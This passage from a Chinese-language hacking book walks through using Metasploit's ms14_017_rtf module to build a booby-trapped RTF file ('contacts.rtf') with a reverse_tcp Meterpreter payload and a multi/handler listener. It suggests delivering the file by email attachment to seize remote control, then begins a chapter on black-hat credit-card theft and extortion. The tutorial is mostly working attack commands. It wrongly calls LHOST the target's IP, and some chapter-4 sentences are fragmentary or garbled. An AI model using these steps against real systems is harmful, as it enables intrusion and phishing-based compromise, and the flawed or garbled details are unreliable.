
Metasploit Framework 包含的漏洞应用非常广泛。该框架中工具的一个极大优势在于是，总有办法让它们互为补充。在本章中，你将学习 `ms14_017_rtf` 漏洞，以及如何使用它向 Windows 7 计算机投送有效负载，以利用已知漏洞并远程破解该计算机。

## 使用 Meterpreter 执行 Metasploit 漏洞攻击

现在你已经知道漏洞在 Metasploit 中是如何工作的，让我们尝试使用 `ms14_017_rtf` 漏洞攻击你的目标 Windows 计算机。你可以搜索该漏洞以获取更多信息。

几年前，Windows 7 中发现了一个漏洞，允许远程黑客通过向目标发送一个富文本文件来远程控制系统。你只需要创建并保存一个 `.rtf` 文件漏洞，然后发送给目标。当文件被打开时，就会启动一个 `meterpreter` 会话，允许你远程在目标系统上执行几乎任何操作。假设你新安装的 Windows 7 没有补丁，它应该还有这个明显的漏洞。

本章向你介绍了另一个非常有用且强大的黑客工具：`meterpreter`。它是一个高级且动态扩展的有效负载，能够获取对目标系统的完全访问权限。

### 第 1 步：启动 Metasploit

有两种方式可以在 Kali Linux 上初始化 `Metasploit`：通过终端或通过应用程序菜单。在桌面上，点击左角的角的快捷方式，进入 `Kali Linux > Top 10 Security Tools > Metasploit Framework`，然后选择通过互联网破解计算机的 exploit。

### 第 2 步：初始化漏洞

当 Metasploit 服务初始化时，在其终端窗口中输入以下命令来初始化漏洞：

`msf > use exploit/windows/fileformat/ms14_017_rtf`

`msf exploit[ms14_017_rtf] >`

如果你想查看有关已加载漏洞的更多信息，可以使用 `info` 命令。

### 第 3 步：设置漏洞选项

下一步是检查该漏洞还需要哪些进一步的信息或进程。使用 `show options` 命令打开你可能需要为该漏洞设置的选项列表。

`msf > use exploit/windows/fileformat/ms14_017_rtf`

`msf exploit(ms14_017_rtf) > show options`

终端窗口将打开一个选项列表。它们包括指定 rtf 漏洞文件的文件名、设置有效负载以及定义 `LHOST`（目标 IP 地址）。

### 第 4 步：为漏洞命名

选择一个目标会分配给富文本文件的任何适当文件名。在案例中，我们将使用 `contacts.rtf`。我们将使用此命令分配文件名：

`msf > use exploit/windows/fileformat/ms14_017_rtf`

`msf exploit(ms14_017_rtf) > set FILENAME contacts.rtf`

`FILENAME => contacts.rtf`

`msf exploit(ms14_017_rtf) >`

### 第 5 步：设置有效负载

接下来，我们将使用 `PAYLOAD` 命令为存储在 `/windows/meterpreter/` 下的 `contacts.rtf` 文件设置 `reverse_tcp` 有效负载。这将帮助我们在文件被打开时初始化 `meterpreter` 会话，使我们即使通过互联网也能远程破解目标计算机。

`FILENAME => contacts.rtf`

`msf exploit(ms14_017_rtf) > set PAYLOAD windows/meterpreter/reverse_tcp`

`PAYLOAD => windows/meterpreter/reverse_tcp`

`msf exploit(ms14_017_rtf) >`

### 第 6 步：设置目标 IP 地址 (LHOST)

如果你使用本地安装的 Windows 进行练习，请确保网络配置恰当。找到 Windows 7 虚拟副本的 IP 地址并将其设置为 `LHOST`。你可以通过在 Windows 命令行中输入 `ipconfig` 以及 Kali Linux 终端中输入 `iwconfig` 来查找 IP 地址。在演示中我们将使用 `192.168.10.10`。

`PAYLOAD => windows/meterpreter/reverse_tcp`

`msf exploit(ms14_017_rtf) > set LHOST 192.168.10.10`

`LHOST => LHOST 192.168.10.10`

`msf exploit(ms14_017_rtf) >`

### 第 7 步：编译漏洞

使用 `exploit` 命令编译漏洞。

`msf exploit(ms14_017_rtf) > exploit`

`[+] contacts.rtf stored at /root/.msf4/local/contacts.rtf`

`msf exploit(ms14_017_rtf) >`

### 第 8 步：配置漏洞的多路处理器连接

我们现在已成功创建了漏洞。下一步是配置它接受到我们计算机的连接。我们将使用 Multi-Handler 来配置此连接。以下是使用的命令：

`[+] contacts.rtf stored at /root/.msf4/local/contacts.rtf`

`msf exploit(ms14_017_rtf) > use exploit/multi/handler`

使用此命令为 handler 设置使用的有效负载：

`msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp`

`PAYLOAD => windows/meterpreter/reverse_tcp`

`msf exploit(handler) >`

最后设置 `LHOST`，就像我们之前为漏洞设置一样：

`msf exploit(handler) > set LHOST 192.168.10.10`

`LHOST => LHOST 192.168.10.10`

`msf exploit(handler) >`

就是这些！最后一步是将 `.rtf` 文件作为邮件附件或通过链接发送，并等待他们打开。由于我们使用的是虚拟系统，你可以将此文件复制到 Windows 系统并打开它。当文件被打开时，将启动 `meterpreter` 会话，它将授予黑客对系统的完全访问权限。要继续进行这一步，你需要研究 `meterpreter` 尤其是它的命令。

在本章中，你学习了如何使用黑客可以使用的最强大的工具之一来利用 Windows 中的已知漏洞。对你来说最重要的教训是攻击是如何执行的，以及如何使用 `meterpreter` 等各种工具。

### 练习题

Windows 7 Service Pack 1 是初级黑客学习技能最理想的操作系统，因为有许多他们可以练习的已知漏洞。在将来，你将负责寻找自己的漏洞，这包括关注微软发布的补丁更新。

了解更多关于运行在 Windows 7 Service Pack 1 上的 Internet Explorer 8 内存损坏漏洞的信息，并使用在本章中学习的方法来利用它并破解你的虚拟 Windows 安装。

# 第 4 章 黑帽黑客

保持好奇心并学习某些主题甚至精通它们是好事，但你应该始终知道界限。我的意图并不是教你如何成为一名黑帽黑客，事实上我不鼓励你成为其中一员，但我将提供关于什么是黑帽黑客的概述。首先，让我说，根据我们目前的社会，黑帽黑客确实是坏的。是的，他们是坏人，仅此而已，但如果你与他们任何一个交谈，他们会对他们所做的事情以及为什么这不是坏事给出完美的解释（至少有些人是这样）。

你必须理解的是黑帽黑客非常聪明，在成为其中一员之前，他们很大一部分曾是白帽黑客。为了抓住他们，可能实际上是因为他们想被抓住，而不是犯了错。

使用它进行购物的唯一目的。如今，游戏已经改变了。黑客不再仅仅试图盗取一张信用卡信息，而是攻入大型公司网站，窃取数十万张信用卡信息并在暗网出售。

我甚至听过有些暗网卖家以 10 个为一组出售包含密码码在内的信用卡信息，价格低至只需 5 美元，如果你有资金，甚至可以买到几十万张。

当个人甚至许多人的信用卡信息被盗取时，一旦证实，银行将对受害者进行补偿；然而，如果个人丢失了个人信息，如个人照片、视频或任何作品，那将是弥的。

黑客知道某些个人信息可能是无价的，他们经常使用勒索受害者的手段。勒索受害者的趋势似乎各异；但平均金额在 200 美元至 500 美元之间。

他们在黑入受害者电脑后，最常用的策略是将其锁定并要求在 24 小时内支付 400 美元，还会设置一个倒计时计时器来促使你付款。

一旦黑客入侵系统，按照传统做法，他们会分析被劫持的是什么，并根据可能的价值索要价格。例如，如果黑客在不同的假期里发现了 10,000 张家庭照片，他们会要求支付 2,000 美元，由于某些受害者因为金额太大而冒着不付款的风险，黑客已经改变了游戏规则。
